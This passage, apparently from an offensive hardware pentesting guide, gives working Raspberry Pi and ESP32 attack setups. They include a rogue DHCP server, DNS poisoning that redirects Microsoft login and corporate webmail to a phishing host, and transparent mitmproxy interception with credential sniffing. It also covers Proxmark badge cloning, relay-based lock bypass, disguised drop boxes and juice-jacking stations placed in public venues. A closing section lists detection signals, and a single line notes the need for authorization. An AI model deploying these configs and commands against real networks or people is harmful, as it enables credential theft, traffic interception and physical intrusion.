# /etc/dhcp/dhcpd.conf — rogue DHCP config
default-lease-time 60;         # short lease to get victims faster
max-lease-time 120;
authoritative;                 # aggressively respond to DHCP requests

subnet 10.0.0.0 netmask 255.255.255.0 {
  range 10.0.0.200 10.0.0.250; # use a range unlikely to conflict
  option routers 10.0.0.1;     # real gateway (or Pi if doing MITM)
  option domain-name-servers 10.0.0.99;  # Pi's IP — all DNS goes through us
}

# Start rogue DHCP
dhcpd -cf /etc/dhcp/dhcpd.conf eth0

# dnsmasq for selective DNS poisoning
# /etc/dnsmasq.d/poison.conf
address=/login.microsoftonline.com/10.0.0.99   # redirect to our phishing page
address=/mail.company.com/10.0.0.99            # redirect webmail
server=8.8.8.8                                 # forward everything else legitimately

systemctl start dnsmasq

# mitmproxy for intercepting HTTP/HTTPS traffic
mitmproxy --mode transparent --listen-host 10.0.0.99 -p 8080
# Requires victims to trust the mitmproxy CA — more useful for HTTP
# For HTTPS: combine with sslstrip or Evilginx-style AiTM

# Bettercap alternative (all-in-one)
bettercap -iface eth0
> set dhcp6.spoof.domains *
> dhcp6.spoof on
> set dns.spoof.domains login.microsoftonline.com
> dns.spoof on
```

---

## Raspberry Pi — Portable MITM Proxy

```bash
# Pi as a transparent MITM proxy for intercepting mobile app traffic
# Place Pi between target device and network (Wi-Fi AP + upstream Ethernet)

# Setup: Pi creates Wi-Fi AP, routes to corporate Ethernet
# wlan0 = AP (target connects here)
# eth0 = upstream (corporate network)

apt install hostapd dnsmasq mitmproxy

# hostapd AP config (see Evil Twin section for full config)
# Key difference: this is transparent interception, not credential capture

# IP forwarding and NAT
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Redirect HTTP/HTTPS through mitmproxy
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Run mitmproxy in transparent mode
mitmproxy --mode transparent --listen-port 8080 --ssl-insecure

# For mobile app testing:
# 1. Install mitmproxy CA cert on target device
# 2. Connect device to Pi's Wi-Fi AP
# 3. All HTTP/HTTPS traffic flows through mitmproxy
# 4. Inspect API calls, auth tokens, session cookies in real time

# Automated credential extraction
mitmdump --mode transparent --listen-port 8080 -s credential_sniffer.py
# credential_sniffer.py filters for login forms, API tokens, cookies
```

---

## Raspberry Pi — Physical Security Augmentation

```bash
# Pi + Proxmark3 = portable badge cloning station
# Connect Proxmark3 via USB to Pi, operate remotely over SSH/tunnel

apt install proxmark3

# Read a badge (125 kHz HID ProxCard)
proxmark3> lf search              # auto-detect card type
proxmark3> lf hid read            # read HID credential
proxmark3> lf hid clone -r 2004AABBCC   # clone to T5577 blank card

# Read a badge (13.56 MHz MIFARE Classic)
proxmark3> hf search              # auto-detect card type
proxmark3> hf mf autopwn          # automated MIFARE Classic key recovery + dump

# Pi + USB camera = covert badge photography
# Capture badge photos for visual cloning or number extraction
# fswebcam (lightweight USB webcam capture)
apt install fswebcam
fswebcam -r 1280x720 --no-banner /tmp/badge_$(date +%s).jpg

# Pi + relay board = electronic lock bypass
# 4-channel relay connected to GPIO can:
# - Bypass mag-lock power (interrupt 12V/24V supply)
# - Simulate REX (Request to Exit) sensor activation
# - Control electric strike remotely via SSH
# IMPORTANT: only with explicit authorization in physical pentest scope

# Pi as a network-connected USB drop
# Disguise Pi Zero 2W inside:
# - USB wall charger (appears to be charging a phone)
# - Network switch (3D-printed case that looks like a small switch)
# - Power strip (Pi hidden inside, powered by mains)
# - Under a desk (double-sided tape, powered by USB port)
```

---

## ESP32 — Rogue Charging Station

```bash
# ESP32-S2/S3 in a charging cable or station
# When a phone connects to charge, the ESP32:
# 1. Attempts USB data connection (juice jacking)
# 2. If data connection succeeds: HID injection on phone
# 3. Simultaneously runs Wi-Fi attacks (evil portal, deauth)

# Build: ESP32-S3 + USB-C female breakout board + 3D-printed enclosure
# The ESP32 sits between the charging cable and the phone

# Android HID injection (if USB debugging or OTG enabled)
# ESP32-S3 acts as USB keyboard, types commands on unlocked Android phone:
# - Open Chrome, navigate to payload URL
# - Open terminal emulator, run commands
# - Modify Wi-Fi settings

# Operational deployment:
# - Conference room charging station
# - Hotel lobby or airport charging kiosk
# - Shared workspace charging cables
# - "Free charging" station at events

# Defense: USB data blockers ("USB condoms") prevent data pins from connecting
# Modern phones show "Trust this computer?" prompt before allowing data
# iOS requires explicit trust + unlock; Android varies by manufacturer
```

---

## Combined ESP32 + Raspberry Pi Deployments

```bash
# ESP32 as remote trigger for Raspberry Pi implant
# ESP32 monitors for attacker's phone BLE beacon
# When detected, ESP32 signals Pi via GPIO or serial to activate payload
# Prevents the Pi from running attacks until the operator is on-site

# Architecture:
# ESP32 (BLE scanner) → GPIO pin → Pi (runs attack toolkit)
# ESP32 scans for specific BLE UUID advertisement from attacker's phone
# When UUID is seen: pull GPIO high → Pi wakes from sleep and starts C2

# ESP32 as Wi-Fi probe for Raspberry Pi
# ESP32 runs Marauder/Ghost ESP for Wi-Fi recon
# Feeds discovered SSIDs, clients, and probes to Pi over serial
# Pi uses this intelligence to configure targeted evil twin attacks
# Pi has the horsepower (hostapd, EAPHammer); ESP32 has the RF flexibility

# Multi-ESP32 mesh for building coverage
# Deploy 3-5 ESP32s (running Ghost ESP or Marauder) across a building
# Each reports to a central Pi over ESP-NOW (peer-to-peer, no AP needed)
# Pi aggregates: complete picture of all Wi-Fi clients, their movements,
# which SSIDs they probe for, and BLE device tracking
# Range: ESP-NOW reaches ~200m LOS between ESP32 nodes
```

## Detection Signals

```
ESP32 deauth / beacon flood:
  - Enterprise WIDS (Cisco, Aruba, Ruckus) — deauth frame anomaly alerts
  - 802.11w/PMF clients are immune to deauth — attack has no effect on modern devices
  - RSSI fingerprinting can identify that a new radio appeared near a legitimate AP

ESP32 Evil Portal / KARMA:
  - WIDS duplicate SSID / BSSID mismatch alert
  - Client deauth events logged in AP controller before clients roam to evil twin

P4wnP1 / USB HID injection:
  - Windows Event ID 6416 — new external device (HID keyboard enumerated)
  - EDR: HID input → immediate cmd/powershell spawn within seconds of plug-in
  - USBGuard or Intune device compliance blocks unauthorized HID devices
  - RNDIS interface visible in ARP table — anomalous MAC on switch port

Network dropbox:
  - Switch port anomaly: MAC changes on port, or new MAC appears mid-session
  - WireGuard (UDP 51820) or ZeroTier traffic visible in firewall logs
  - LTE modem (USB device) enumerated on switch if switch has USB discovery
  - Responder traffic: LLMNR/NBT-NS multicast visible in network packet capture

Pwnagotchi:
  - Repeated deauth + (re)association requests from same MAC across multiple APs
  - Unusual probe responses (AP replies to malformed PMKID association request)

UART / JTAG access:
  - Physical access required — no network detection surface
  - Some devices log JTAG attachment via hardware tamper sensors or fuse bits
  - U-Boot modifications detectable via firmware integrity checks (secure boot)
```

---

## Resources

- ESP32 Marauder — `github.com/justcallmekoko/ESP32Marauder`
- Ghost ESP — `github.com/Spooks4576/Ghost_ESP` / `github.com/GhostESP-Revival`
- ESP8266 Deauther — `github.com/SpacehuhnTech/esp8266_deauther`
- UltraWiFiDuck — `github.com/EmileSpecialProducts/UltraWiFiDuck`
- WiFiDuck — `github.com/SpacehuhnTech/WiFiDuck`
- ESP32-BLE-Keyboard — `github.com/T-vK/ESP32-BLE-Keyboard`
- ESP32-Paxcounter — `github.com/cyberman54/ESP32-Paxcounter`
- P4wnP1 A.L.O.A. — `github.com/mame82/P4wnP1_aloa`
- Pwnagotchi (maintained fork) — `github.com/jayofelony/pwnagotchi`
- WiEvil (Pi evil twin) — `github.com/exfil0/WiEvil`
- EAPHammer — `github.com/s0lst1c3/eaphammer`
- hostapd-mana — `github.com/sensepost/hostapd-mana`
- SavvyCAN (CAN bus analysis) — `github.com/collin80/SavvyCAN`
- PiRogue Tool Suite — `pts-project.org`
- OpenOCD — `openocd.org`
- JTAGenum — `github.com/cyphunk/JTAGenum`
- Flashrom — `flashrom.org`
- hcxtools — `github.com/ZerBea/hcxtools`
- multimon-ng (pager decoding) — `github.com/EliasOeworthy/multimon-ng`
- OP25 (P25 trunked radio) — `github.com/boatbod/op25`
- Bettercap — `github.com/bettercap/bettercap`
